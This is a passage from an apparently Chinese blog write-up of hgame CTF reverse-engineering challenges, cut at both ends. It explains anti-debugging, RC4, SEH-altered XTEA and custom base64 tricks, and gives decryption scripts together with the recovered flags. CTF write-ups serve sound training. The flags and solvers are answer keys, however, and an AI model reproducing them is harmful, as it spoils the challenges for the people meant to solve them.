class="comment">#print(hex(temp))</span></span><br><span class="line">      <span class="keyword">if</span>(enc[i]== temp&amp;<span class="number">0xffff</span>):</span><br><span class="line">        flag+=<span class="built_in">chr</span>(f)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#noW_YOu~koNw-UPx~mAG|C_@Nd~crC16</span></span><br></pre></td></tr></table></figure><h3 id="fake-shell"><a href="#fake-shell" class="headerlink" title="fake shell"></a>fake shell</h3><p>一个假的shell，实际上就是一些打印函数，在sudo后，会输入flag，然后进行check。但是需要注意的是有一个linux下的反调试。</p><p>在执行main函数前是先会执行init里面的代码，然后这里面可以加入自己的代码，这道题就是加了一个检查进程运行状态的反调试。<a href="https://blog.csdn.net/qq_39387233/article/details/117186430">https://blog.csdn.net/qq_39387233/article/details/117186430</a></p><p><img src="https://s2.loli.net/2022/02/23/pHyAExRIMicbPzY.png"><br>修改了后面rc4加密的key。</p><p>加密函数在sub_176C，rc4加密。用网站解，或者获得异或值就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">xor=[  <span class="number">0xBF</span>, <span class="number">0x91</span>, <span class="number">0xF8</span>, <span class="number">0x86</span>, <span class="number">0x3D</span>, <span class="number">0x42</span>, <span class="number">0xA6</span>, <span class="number">0xB8</span>, <span class="number">0xEE</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xCD</span>, <span class="number">0x62</span>, <span class="number">0xC4</span>, <span class="number">0x6C</span>, <span class="number">0x95</span>, <span class="number">0xC8</span>, <span class="number">0x18</span>, <span class="number">0x0F</span>, <span class="number">0x5D</span>, <span class="number">0x5A</span>,</span><br><span class="line">  <span class="number">0xD2</span>, <span class="number">0xAD</span>, <span class="number">0x7E</span>, <span class="number">0x25</span>, <span class="number">0x77</span>, <span class="number">0x5E</span>, <span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xF2</span>, <span class="number">0xE7</span>,</span><br><span class="line">  <span class="number">0xF9</span>, <span class="number">0xBD</span>]</span><br><span class="line">Fflag=<span class="string">b&#x27;abcdefghijklmnopqrstuvwxyz123456&#x27;</span></span><br><span class="line">enc=[    <span class="number">0xB6</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x8F</span>, <span class="number">0x3D</span>, <span class="number">0x5F</span>, <span class="number">0xB2</span>, <span class="number">0xE0</span>, <span class="number">0xEA</span>, <span class="number">0x0F</span>,</span><br><span class="line">  <span class="number">0xD2</span>, <span class="number">0x66</span>, <span class="number">0x98</span>, <span class="number">0x6C</span>, <span class="number">0x9D</span>, <span class="number">0xE7</span>, <span class="number">0x1B</span>, <span class="number">0x08</span>, <span class="number">0x40</span>, <span class="number">0x71</span>,</span><br><span class="line">  <span class="number">0xC5</span>, <span class="number">0xBE</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x7C</span>, <span class="number">0x7B</span>, <span class="number">0x09</span>, <span class="number">0x8D</span>, <span class="number">0xA8</span>, <span class="number">0xBD</span>,</span><br><span class="line">  <span class="number">0xF3</span>, <span class="number">0xF6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    print(<span class="built_in">chr</span>(enc[i]^Fflag[i]^xor[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#hgame&#123;s0meth1ng_run_bef0r_m4in?&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="creakme2"><a href="#creakme2" class="headerlink" title="creakme2"></a>creakme2</h3><p>考点c++的seh异常处理，这个题的主逻辑是一个xtea加密，但是加密的sum会因为seh的关系在32次的某几次被二次修改。</p><p>f5看不了seh，需要看汇编。<br><img src="https://s2.loli.net/2022/02/23/a6q42xHIRGyLYDV.png"><br>所以就是对sum多加了一个判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sum&gt;&gt;<span class="number">0x1f</span>==<span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">   sum^=<span class="number">0x1234567</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>解密脚本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="comment">//abcdefghijklmnopqrstuvwxyz123456</span></span><br><span class="line"><span class="comment">//75AF0A92 2E15816F</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> r ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *flag ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0,v1,i;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> delta=<span class="number">0x9E3779B1</span>;</span><br><span class="line">    v0=flag[<span class="number">0</span>];</span><br><span class="line">    v1=flag[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;r;i++) </span><br><span class="line">    &#123;</span><br><span class="line">        v0+=( ((v1&lt;&lt;<span class="number">4</span>) ^ (v1&gt;&gt;<span class="number">5</span>)) +v1 ) ^ ( sum + key[sum&amp;<span class="number">3</span>] );</span><br><span class="line">        sum+=delta;</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;&gt;<span class="number">0x1f</span>==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        sum^=<span class="number">0x1234567</span>;</span><br><span class="line">&#125;    </span><br><span class="line">        v1+=( ((v0&lt;&lt;<span class="number">4</span>) ^(v0&gt;&gt;<span class="number">5</span>)) +v0 ) ^ ( sum + key[ (sum&gt;&gt;<span class="number">11</span>)&amp;<span class="number">3</span> ]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,sum);</span><br><span class="line">    flag[<span class="number">0</span>]=v0;</span><br><span class="line">    flag[<span class="number">1</span>]=v1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> r ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *code ,<span class="keyword">unsigned</span> <span class="keyword">int</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0,v1,i,delta=<span class="number">0x9E3779B1</span>;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0x0C78E4D05</span>;</span><br><span class="line"></span><br><span class="line">    v0=code[<span class="number">0</span>];</span><br><span class="line">    v1=code[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;r;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1-=( ((v0&lt;&lt;<span class="number">4</span>) ^(v0&gt;&gt;<span class="number">5</span>)) +v0 ) ^ ( sum + key[ (sum&gt;&gt;<span class="number">11</span>)&amp;<span class="number">3</span> ]);</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;&gt;<span class="number">0x1f</span>==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        sum^=<span class="number">0x1234567</span>;</span><br><span class="line">&#125; </span><br><span class="line">        sum-=delta;</span><br><span class="line">        v0-=( ((v1&lt;&lt;<span class="number">4</span>) ^ (v1&gt;&gt;<span class="number">5</span>)) +v1 ) ^ ( sum + key[sum&amp;<span class="number">3</span>] );</span><br><span class="line">    &#125;</span><br><span class="line">    code[<span class="number">0</span>]=v0;</span><br><span class="line">    code[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> r=<span class="number">32</span>,i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> code[<span class="number">8</span>]=&#123;<span class="number">0x457E62CF</span>,<span class="number">0x9537896C</span>,<span class="number">0x1F7E7F72</span>,<span class="number">0xF7A073D8</span>,<span class="number">0x8E996868</span>,<span class="number">0x40AFAF99</span>,<span class="number">0xF990E34</span>, <span class="number">0x196F4086</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flag[<span class="number">2</span>]=&#123;<span class="number">0x64636261</span>,<span class="number">0x68676665</span>&#125;;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">//encrypt(r,flag,key);</span></span><br><span class="line"><span class="comment">//printf(&quot;%08x %08x\n&quot;,flag[0],flag[1]);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">decrypt(r,&amp;code[i*<span class="number">2</span>],key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">0</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">1</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">2</span>),*((<span class="keyword">char</span>*)&amp;code[i]+<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hgame&#123;SEH_s0und5_50_1ntere5ting&#125;</span></span><br></pre></td></tr></table></figure><h3 id="upx-magic1"><a href="#upx-magic1" class="headerlink" title="upx magic1"></a>upx magic1</h3><p>调试就完事了，慢慢调，找到加密的地方，和upx magic 0的加密完全一样，只是密文多了几个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">v4=[<span class="number">0</span>]*<span class="number">37</span></span><br><span class="line">v4[<span class="number">0</span>] = <span class="number">0x8D68</span></span><br><span class="line">v4[<span class="number">1</span>] = <span class="number">40265</span></span><br><span class="line">v4[<span class="number">2</span>] = <span class="number">10770</span></span><br><span class="line">v4[<span class="number">3</span>] = <span class="number">43802</span></span><br><span class="line">v4[<span class="number">4</span>] = <span class="number">52188</span></span><br><span class="line">v4[<span class="number">5</span>] = <span class="number">47403</span></span><br><span class="line">v4[<span class="number">6</span>] = <span class="number">11826</span></span><br><span class="line">v4[<span class="number">7</span>] = <span class="number">40793</span></span><br><span class="line">v4[<span class="number">8</span>] = <span class="number">56781</span></span><br><span class="line">v4[<span class="number">9</span>] = <span class="number">40265</span></span><br><span class="line">v4[<span class="number">10</span>] = <span class="number">43274</span></span><br><span class="line">v4[<span class="number">11</span>] = <span class="number">3696</span></span><br><span class="line">v4[<span class="number">12</span>] = <span class="number">62927</span></span><br><span class="line">v4[<span class="number">13</span>] = <span class="number">24277</span></span><br><span class="line">v4[<span class="number">14</span>] = <span class="number">15363</span></span><br><span class="line">v4[<span class="number">15</span>] = <span class="number">31879</span></span><br><span class="line">v4[<span class="number">16</span>] = <span class="number">9842</span></span><br><span class="line">v4[<span class="number">17</span>] = <span class="number">43802</span></span><br><span class="line">v4[<span class="number">18</span>] = <span class="number">2640</span></span><br><span class="line">v4[<span class="number">19</span>] = <span class="number">23285</span></span><br><span class="line">v4[<span class="number">20</span>] = <span class="number">65439</span></span><br><span class="line">v4[<span class="number">21</span>] = <span class="number">40793</span></span><br><span class="line">v4[<span class="number">22</span>] = <span class="number">48395</span></span><br><span class="line">v4[<span class="number">23</span>] = <span class="number">22757</span></span><br><span class="line">v4[<span class="number">24</span>] = <span class="number">14371</span></span><br><span class="line">v4[<span class="number">25</span>] = <span class="number">48923</span></span><br><span class="line">v4[<span class="number">26</span>] = <span class="number">30887</span></span><br><span class="line">v4[<span class="number">27</span>] = <span class="number">43802</span></span><br><span class="line">v4[<span class="number">28</span>] = <span class="number">18628</span></span><br><span class="line">v4[<span class="number">29</span>] = <span class="number">43274</span></span><br><span class="line">v4[<span class="number">30</span>] = <span class="number">11298</span></span><br><span class="line">v4[<span class="number">31</span>] = <span class="number">40793</span></span><br><span class="line">v4[<span class="number">32</span>] = <span class="number">0x5CC5</span></span><br><span class="line">v4[<span class="number">33</span>] = <span class="number">0x5ED5</span></span><br><span class="line">v4[<span class="number">34</span>] = <span class="number">0x78A7</span></span><br><span class="line">v4[<span class="number">35</span>] = <span class="number">0x2672</span></span><br><span class="line">v4[<span class="number">36</span>] = <span class="number">0x5695</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v4:</span><br><span class="line">  print(<span class="built_in">hex</span>(i),end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">enc=[<span class="number">0x8d68</span>,<span class="number">0x9d49</span>,<span class="number">0x2a12</span>,<span class="number">0xab1a</span>,<span class="number">0xcbdc</span>,<span class="number">0xb92b</span>,<span class="number">0x2e32</span>,<span class="number">0x9f59</span>,<span class="number">0xddcd</span>,<span class="number">0x9d49</span>,<span class="number">0xa90a</span>,<span class="number">0xe70</span>,<span class="number">0xf5cf</span>,<span class="number">0x5ed5</span>,<span class="number">0x3c03</span>,<span class="number">0x7c87</span>,<span class="number">0x2672</span>,<span class="number">0xab1a</span>,<span class="number">0xa50</span>,<span class="number">0x5af5</span>,<span class="number">0xff9f</span>,<span class="number">0x9f59</span>,<span class="number">0xbd0b</span>,<span class="number">0x58e5</span>,<span class="number">0x3823</span>,<span class="number">0xbf1b</span>,<span class="number">0x78a7</span>,<span class="number">0xab1a</span>,<span class="number">0x48c4</span>,<span class="number">0xa90a</span>,<span class="number">0x2c22</span>,<span class="number">0x9f59</span>,<span class="number">0x5cc5</span>,<span class="number">0x5ed5</span>,<span class="number">0x78a7</span>,<span class="number">0x2672</span>,<span class="number">0x5695</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>):</span><br><span class="line">  <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">      temp = f &lt;&lt; <span class="number">8</span></span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">          <span class="keyword">if</span> ((temp &amp; <span class="number">0x8000</span>) != <span class="number">0</span>):</span><br><span class="line">              temp = (<span class="number">2</span> * temp) ^ <span class="number">0x1021</span></span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">              temp *= <span class="number">2</span></span><br><span class="line">      <span class="comment">#print(hex(temp))</span></span><br><span class="line">      <span class="keyword">if</span>(enc[i]== temp&amp;<span class="number">0xffff</span>):</span><br><span class="line">        flag+=<span class="built_in">chr</span>(f)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#noW_YOu~koNw-rea1_UPx~mAG|C_@Nd~crC16</span></span><br></pre></td></tr></table></figure><h2 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h2><p>这周的最后一题由于没使用findcrypt插件导致没解出来，也是第一次接触到blowfish加密吧。</p><h3 id="Answer’s-Windows"><a href="#Answer’s-Windows" class="headerlink" title="Answer’s Windows"></a>Answer’s Windows</h3><p>用窗口实现了一个伪windows登录界面，实际上就是一个输入check和加载变换的图片。而且程序体量还比较大，估计使用了什么框架来编写的这个窗口吧。</p><p>也是有一个简单的反调试。<br><img src="https://s2.loli.net/2022/02/23/2YlFizDrGx41HPV.png"><br>通过字符串定位，可以很快知道密文的位置，从而知道加密函数大概在哪。<br><img src="https://s2.loli.net/2022/02/23/SF1azUWHvc3omTA.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enc=<span class="string">&quot;;&#x27;&gt;B&lt;76\\=82@-8.@=T\&quot;@-7ZU:8*F=X2J&lt;G&gt;@=W^@-8.@9D2T:49U@1aa&quot;</span></span><br><span class="line"></span><br><span class="line">table=[<span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2A</span>,</span><br><span class="line">  <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3A</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0x3E</span>,</span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x49</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0x4F</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>,</span><br><span class="line">  <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5C</span>,</span><br><span class="line">  <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0x5F</span>, <span class="number">0x60</span>,<span class="number">0x61</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">base = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">ans += base[table.index(<span class="built_in">ord</span>(i))]</span><br><span class="line">print(ans)</span><br><span class="line">print(base64.b64decode(ans))</span><br><span class="line"><span class="comment">#hgame&#123;qt_1s_s0_1nteresting_so_1s_b4se64&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="creakme3"><a href="#creakme3" class="headerlink" title="creakme3"></a>creakme3</h3><p>PowerPc，升级版的ida7.5可以f5。</p><p>来看看代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+1Ch] [-184h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [sp+20h] [-180h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [sp+24h] [-17Ch]</span></span><br><span class="line">  _BYTE v7[<span class="number">372</span>]; <span class="comment">// [sp+28h] [-178h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">0x164</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome my whitegive re task! This is your flag: &quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">88</span>; ++i )</span><br><span class="line">      *(_DWORD *)&amp;v7[<span class="number">4</span> * i] = rand() % <span class="number">89</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">1</span>; j &lt;= <span class="number">88</span> &amp;&amp; a[<span class="number">2</span> * *(_DWORD *)&amp;v7[<span class="number">4</span> * j] + <span class="number">1</span>] &gt;= a[<span class="number">2</span> * *(_DWORD *)&amp;v7[<span class="number">4</span> * j - <span class="number">4</span>] + <span class="number">1</span>]; ++j )</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( j != <span class="number">89</span> );</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">88</span>; ++k )</span><br><span class="line">    <span class="built_in">putchar</span>(a[<span class="number">2</span> * *(_DWORD *)&amp;v7[<span class="number">4</span> * k]]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到就是rand()产生了长度为89的数组作为a数组的index，使其满足些条件，通过看代码和看数据可知，a数组是分奇，偶位操作的。偶数位为单字节字符，奇数位为双字节数据，奇数位的数据需要配合rand产生的数据去满足一些大小判断，测试下[5，2，7，3]，实际上就可以得到满足的数据为[2,0,3,1]，所以实际上就是大小排序的index。</p><p>脚本如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a[<span class="number">178</span>] = &#123;</span><br><span class="line">    <span class="number">0x30</span>, <span class="number">0x4E7D</span>, <span class="number">0x30</span>, <span class="number">0x67BD</span>, <span class="number">0x30</span>, <span class="number">0x7A48</span>, <span class="number">0x30</span>, <span class="number">0x82A2</span>, <span class="number">0x30</span>, <span class="number">0x933E</span>, <span class="number">0x31</span>, <span class="number">0x9C18</span>, <span class="number">0x32</span>, <span class="number">0x5AFF</span>, <span class="number">0x32</span>, <span class="number">0x6CD7</span>, <span class="number">0x32</span>, <span class="number">0xA6CA</span>, <span class="number">0x32</span>, <span class="number">0xBD79</span>, <span class="number">0x32</span>, <span class="number">0xCEBD</span>, <span class="number">0x33</span>, <span class="number">0x324A</span>, <span class="number">0x33</span>, <span class="number">0x3292</span>, <span class="number">0x33</span>, <span class="number">0x3905</span>, <span class="number">0x33</span>, <span class="number">0x4291</span>, <span class="number">0x33</span>, <span class="number">0x5ADE</span>, <span class="number">0x33</span>,</span><br><span class="line"><span class="number">0x6E9F</span>, <span class="number">0x33</span>, <span class="number">0xA52A</span>, <span class="number">0x33</span>, <span class="number">0xBE35</span>, <span class="number">0x33</span>, <span class="number">0xCB63</span>, <span class="number">0x35</span>, <span class="number">0x7F3B</span>, <span class="number">0x38</span>, <span class="number">0x3914</span>, <span class="number">0x38</span>, <span class="number">0xB2AD</span>, <span class="number">0x39</span>, <span class="number">0x38DA</span>, <span class="number">0x39</span>, <span class="number">0x4E50</span>, <span class="number">0x39</span>, <span class="number">0x6A02</span>, <span class="number">0x39</span>, <span class="number">0xB10F</span>, <span class="number">0x42</span>, <span class="number">0x78E5</span>, <span class="number">0x5F</span>, <span class="number">0x7EF6</span>, <span class="number">0x5F</span>, <span class="number">0x89A3</span>, <span class="number">0x5F</span>, <span class="number">0x8EBD</span>, <span class="number">0x5F</span>, <span class="number">0x95E3</span>, <span class="number">0x61</span>, <span class="number">0x73DA</span>,</span><br><span class="line"><span class="number">0x64</span>, <span class="number">0x538C</span>, <span class="number">0x64</span>, <span class="number">0x633B</span>, <span class="number">0x64</span>, <span class="number">0x9E9C</span>, <span class="number">0x64</span>, <span class="number">0xB78B</span>, <span class="number">0x64</span>, <span class="number">0xC866</span>, <span class="number">0x65</span>, <span class="number">0x32AE</span>, <span class="number">0x65</span>, 